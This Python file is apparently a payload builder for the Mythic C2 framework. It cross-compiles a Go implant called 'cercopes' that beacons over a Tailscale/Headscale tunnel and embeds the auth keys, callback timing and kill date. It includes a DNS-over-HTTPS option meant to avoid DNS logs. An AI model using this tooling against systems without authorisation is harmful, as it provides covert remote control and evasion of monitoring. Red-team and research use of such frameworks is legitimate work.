import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class TailAgent(PayloadType):
    name = "cercopes"
    file_extension = ""
    author = "@Yeeb1"
    mythic_encrypts = True
    supported_os = [
        SupportedOS.Linux,
        SupportedOS.Windows,
        SupportedOS.MacOS,
    ]
    semver = "0.1.0"
    wrapper = False
    note = "Tailscale/Headscale mesh VPN demo agent using tsnet"
    supports_dynamic_loading = False
    supports_multiple_c2_instances_in_build = False
    supports_multiple_c2_in_build = False
    c2_profiles = ["tailscale"]
    build_parameters = [
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["amd64", "arm64"],
            default_value="amd64",
            description="Target architecture",
        ),
        BuildParameter(
            name="tailscale_protocol",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["http", "tcp"],
            default_value="http",
            description="Agent-to-C2 transport inside the WireGuard tunnel: http (compatible) or tcp (lower overhead)",
        ),
        BuildParameter(
            name="doh",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["off", "cloudflare", "google", "custom"],
            default_value="off",
            description="DNS-over-HTTPS: resolve Tailscale hostnames via DoH to avoid DNS logs",
        ),
        BuildParameter(
            name="doh_url",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Custom DoH resolver URL (only used when doh=custom, e.g. https://dns.example.com/dns-query)",
        ),
    ]

    agent_path = Path(".") / "cercopes"
    agent_code_path = agent_path / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "cercopes.svg"

    _DOH_URLS = {
        "off": "",
        "cloudflare": "https://1.1.1.1/dns-query",
        "google": "https://8.8.8.8/dns-query",
    }

    def _resolve_doh_url(self):
        choice = self.get_parameter("doh")
        if choice == "custom":
            return self.get_parameter("doh_url")
        return self._DOH_URLS.get(choice, "")

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        try:
            # Get C2 profile parameters
            c2_params = {}
            for c2 in self.c2info:
                profile = c2.get_c2profile()
                c2_params = c2.get_parameters_dict()

                if profile["name"] == "tailscale":
                    # Call generate_config RPC to get per-payload pre-auth key
                    # Extract encryption key from AESPSK parameter
                    enc_key = None
                    aespsk_param = c2_params.get("AESPSK", None)
                    if isinstance(aespsk_param, dict):
                        enc_key = aespsk_param.get("enc_key", None)
                    elif isinstance(aespsk_param, str) and aespsk_param != "none":
                        enc_key = aespsk_param

                    rpc_resp = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
                        ServiceName="tailscale",
                        ServiceRPCFunction="generate_config",
                        ServiceRPCFunctionArguments={
                            "payload_uuid": self.uuid,
                            "killdate": c2_params.get("killdate", ""),
                            "enc_key": enc_key,
                        },
                    ))

                    if not rpc_resp.Success:
                        resp.build_stderr = f"generate_config RPC failed: {rpc_resp.Error}"
                        return resp

                    config = json.loads(rpc_resp.Result)
                    c2_params["auth_key"] = config["auth_key"]
                    c2_params["control_url"] = config["control_url"]
                    c2_params["server_hostname"] = config["server_hostname"]
                    c2_params["server_port"] = config["server_port"]
                    c2_params["tcp_port"] = config.get("tcp_port", "")

            # Copy agent code to temp directory
            agent_src = str(self.agent_code_path)
            with tempfile.TemporaryDirectory() as tmpdir:
                shutil.copytree(agent_src, os.path.join(tmpdir, "agent"))
                agent_dir = os.path.join(tmpdir, "agent")

                # Build ldflags to stamp configuration
                # Map Mythic's selected OS to GOOS values
                os_map = {"Linux": "linux", "Windows": "windows", "macOS": "darwin"}
                target_os = os_map.get(self.selected_os, self.selected_os.lower())
                arch = self.get_parameter("architecture")

                # Get the AES encryption key (base64-encoded)
                aes_key_b64 = ""
                if enc_key:
                    aes_key_b64 = enc_key

                ldflags_parts = [
                    f"-X 'main.PayloadUUID={self.uuid}'",
                    f"-X 'main.AuthKey={c2_params.get('auth_key', '')}'",
                    f"-X 'main.ControlURL={c2_params.get('control_url', '')}'",
                    f"-X 'main.ServerHostname={c2_params.get('server_hostname', 'mythic-c2')}'",
                    f"-X 'main.ServerPort={c2_params.get('server_port', '8080')}'",
                    f"-X 'main.CallbackInterval={c2_params.get('callback_interval', '5')}'",
                    f"-X 'main.CallbackJitter={c2_params.get('callback_jitter', '10')}'",
                    f"-X 'main.KillDate={c2_params.get('killdate', '-1')}'",
                    f"-X 'main.EncExchangeCheck={c2_params.get('encrypted_exchange_check', 'T')}'",
                    f"-X 'main.AESPSKValue={aes_key_b64}'",
                    f"-X 'main.Protocol={self.get_parameter('tailscale_protocol')}'",
                    f"-X 'main.TCPPort={c2_params.get('tcp_port', '')}'",
                    f"-X 'main.DoHURL={self._resolve_doh_url()}'",
                    "-s -w",
                ]
                ldflags = " ".join(ldflags_parts)

                output_name = "cercopes"
                if target_os == "windows":
                    output_name += ".exe"

                output_path = os.path.join(tmpdir, output_name)

                env = os.environ.copy()
                env["GOOS"] = target_os
                env["GOARCH"] = arch
                env["CGO_ENABLED"] = "0"

                proc = subprocess.run(
                    ["go", "build", "-ldflags", ldflags, "-o", output_path, "."],
                    cwd=agent_dir,
                    capture_output=True,
                    text=True,
                    env=env,
                )

                if proc.returncode != 0:
                    resp.build_stderr = proc.stderr
                    resp.build_stdout = proc.stdout
                    return resp

                with open(output_path, "rb") as f:
                    resp.payload = f.read()

                resp.build_message = f"Built cercopes for {target_os}/{arch}"
                resp.status = BuildStatus.Success

        except Exception as e:
            resp.build_stderr = str(e)

        return resp
